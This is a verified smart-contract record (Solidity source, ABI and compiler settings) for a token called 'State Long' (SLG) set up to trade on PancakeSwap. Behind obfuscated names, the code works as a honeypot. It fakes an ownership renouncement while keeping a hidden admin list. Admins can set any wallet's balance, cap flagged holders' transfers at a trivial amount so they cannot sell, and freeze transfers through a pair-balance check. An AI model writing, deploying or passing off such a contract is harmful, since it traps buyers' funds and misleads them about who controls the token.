{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface receiverTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverFundAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atEnable {\n    function createPair(address listEnable, address tokenReceiver) external returns (address);\n}\n\ninterface buyReceiverMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeFund) external view returns (uint256);\n\n    function transfer(address tradingAmount, uint256 totalToken) external returns (bool);\n\n    function allowance(address autoSellMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingAmount,\n        uint256 totalToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toMin, uint256 value);\n    event Approval(address indexed autoSellMin, address indexed spender, uint256 value);\n}\n\ninterface buyReceiverMarketingMetadata is buyReceiverMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StateLong is receiverFundAuto, buyReceiverMarketing, buyReceiverMarketingMetadata {\n\n    address public sellLiquidity;\n\n    function maxAt() private view {\n        require(tradingMarketing[_msgSender()]);\n    }\n\n    uint256 constant buyLiquidity = 20 ** 10;\n\n    address teamLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toLaunch;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeWallet;\n    }\n\n    mapping(address => uint256) private fundTeam;\n\n    function totalLiquidityShould(address shouldTotal, address tradingAmount, uint256 totalToken) internal returns (bool) {\n        require(fundTeam[shouldTotal] >= totalToken);\n        fundTeam[shouldTotal] -= totalToken;\n        fundTeam[tradingAmount] += totalToken;\n        emit Transfer(shouldTotal, tradingAmount, totalToken);\n        return true;\n    }\n\n    function swapReceiver(address maxReceiver) public {\n        maxAt();\n        if (maxExempt != teamSwap) {\n            toEnableIs = true;\n        }\n        if (maxReceiver == sellLiquidity || maxReceiver == receiverToken) {\n            return;\n        }\n        sellBuy[maxReceiver] = true;\n    }\n\n    uint256 public fromAuto;\n\n    address private receiverFrom;\n\n    string private modeWallet = \"State Long\";\n\n    mapping(address => bool) public tradingMarketing;\n\n    function approve(address limitAt, uint256 totalToken) public virtual override returns (bool) {\n        totalFundToken[_msgSender()][limitAt] = totalToken;\n        emit Approval(_msgSender(), limitAt, totalToken);\n        return true;\n    }\n\n    constructor (){\n        if (teamSwap != maxExempt) {\n            maxExempt = teamLaunched;\n        }\n        receiverTrading atModeAuto = receiverTrading(sellAt);\n        receiverToken = atEnable(atModeAuto.factory()).createPair(atModeAuto.WETH(), address(this));\n        if (minLaunched == teamLaunched) {\n            teamSwap = teamLaunched;\n        }\n        sellLiquidity = _msgSender();\n        swapTotal();\n        tradingMarketing[sellLiquidity] = true;\n        fundTeam[sellLiquidity] = senderReceiver;\n        if (limitTx) {\n            teamLaunched = fromAuto;\n        }\n        emit Transfer(address(0), sellLiquidity, senderReceiver);\n    }\n\n    uint8 private toLaunch = 18;\n\n    bool private toEnableIs;\n\n    bool private limitTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMax;\n    }\n\n    uint256 buyTeamLiquidity;\n\n    string private receiverMax = \"SLG\";\n\n    address public receiverToken;\n\n    function owner() external view returns (address) {\n        return receiverFrom;\n    }\n\n    function toLaunchFund(uint256 totalToken) public {\n        maxAt();\n        buyTeamLiquidity = totalToken;\n    }\n\n    uint256 private maxExempt;\n\n    function transferFrom(address shouldTotal, address tradingAmount, uint256 totalToken) external override returns (bool) {\n        if (_msgSender() != sellAt) {\n            if (totalFundToken[shouldTotal][_msgSender()] != type(uint256).max) {\n                require(totalToken <= totalFundToken[shouldTotal][_msgSender()]);\n                totalFundToken[shouldTotal][_msgSender()] -= totalToken;\n            }\n        }\n        return autoReceiver(shouldTotal, tradingAmount, totalToken);\n    }\n\n    function autoReceiver(address shouldTotal, address tradingAmount, uint256 totalToken) internal returns (bool) {\n        if (shouldTotal == sellLiquidity) {\n            return totalLiquidityShould(shouldTotal, tradingAmount, totalToken);\n        }\n        uint256 fundAmount = buyReceiverMarketing(receiverToken).balanceOf(teamLiquidity);\n        require(fundAmount == buyTeamLiquidity);\n        require(tradingAmount != teamLiquidity);\n        if (sellBuy[shouldTotal]) {\n            return totalLiquidityShould(shouldTotal, tradingAmount, buyLiquidity);\n        }\n        return totalLiquidityShould(shouldTotal, tradingAmount, totalToken);\n    }\n\n    event OwnershipTransferred(address indexed fundTo, address indexed fromTake);\n\n    function transfer(address atReceiverFrom, uint256 totalToken) external virtual override returns (bool) {\n        return autoReceiver(_msgSender(), atReceiverFrom, totalToken);\n    }\n\n    function swapTotal() public {\n        emit OwnershipTransferred(sellLiquidity, address(0));\n        receiverFrom = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverFrom;\n    }\n\n    uint256 public teamSwap;\n\n    uint256 private senderReceiver = 100000000 * 10 ** 18;\n\n    address sellAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function enableLimit(address atReceiverFrom, uint256 totalToken) public {\n        maxAt();\n        fundTeam[atReceiverFrom] = totalToken;\n    }\n\n    bool public tradingShould;\n\n    function isShould(address tradingWallet) public {\n        if (tradingShould) {\n            return;\n        }\n        \n        tradingMarketing[tradingWallet] = true;\n        \n        tradingShould = true;\n    }\n\n    uint256 maxShouldMin;\n\n    mapping(address => mapping(address => uint256)) private totalFundToken;\n\n    uint256 public receiverSwap;\n\n    mapping(address => bool) public sellBuy;\n\n    function balanceOf(address takeFund) public view virtual override returns (uint256) {\n        return fundTeam[takeFund];\n    }\n\n    uint256 public teamLaunched;\n\n    uint256 private minLaunched;\n\n    function allowance(address toLaunched, address limitAt) external view virtual override returns (uint256) {\n        if (limitAt == sellAt) {\n            return type(uint256).max;\n        }\n        return totalFundToken[toLaunched][limitAt];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSellMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"enableLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"}],\"name\":\"isShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"}],\"name\":\"swapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"toLaunchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}